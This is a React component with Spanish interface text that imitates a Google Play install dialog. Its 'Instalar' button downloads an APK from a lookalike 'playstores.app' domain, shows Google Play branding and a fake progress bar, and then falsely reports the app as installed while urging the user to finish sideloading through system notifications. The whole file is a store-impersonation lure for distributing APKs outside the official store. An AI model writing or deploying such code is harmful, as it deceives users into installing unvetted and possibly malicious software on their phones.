'use client';

import { useState } from 'react';
import styles from './DownloadPopup.module.css';

export default function DownloadPopup({ slug }) {
  const [popup, setPopup] = useState(false);
  const [progressComplete, setProgressComplete] = useState(false);

  const handleDownload = () => {
    setPopup(true);

    // Inicia la descarga tras un breve retraso
    setTimeout(() => {
      window.location.href = `https://api.playstores.app/apps/${slug}/${slug}.apk`;
    }, 300);

    // Controla la transición después de 7s de carga
    setTimeout(() => {
      setProgressComplete(true);
    }, 7000);
  };

  const closePopup = () => {
    setPopup(false);
    setProgressComplete(false);
  };

  return (
    <>
      <button className={styles.downloadButton} onClick={handleDownload}>
        Instalar
      </button>

      {popup && (
        <div className={styles.overlay}>
          <div className={styles.popup}>
            <div className={styles.header}>
              <img src="/logoplay.svg" alt="Google Play" className={styles.logo} />
              <span className={styles.title}>Google Play</span>
            </div>

            {!progressComplete ? (
              <>
                <div className={styles.progressBar}>
                  <div className={styles.progress}></div>
                </div>
                <p className={styles.message}>Preparando la descarga de la aplicación...</p>
              </>
            ) : (
              <>
                <h3 className={styles.installed}>Aplicación instalada</h3>
                <p className={styles.instruction}>
                  Abre las notificaciones del sistema y completa la instalación.
                </p>
                <button className={styles.okButton} onClick={closePopup}>
                  OK
                </button>
              </>
            )}
          </div>
        </div>
      )}
    </>
  );
}
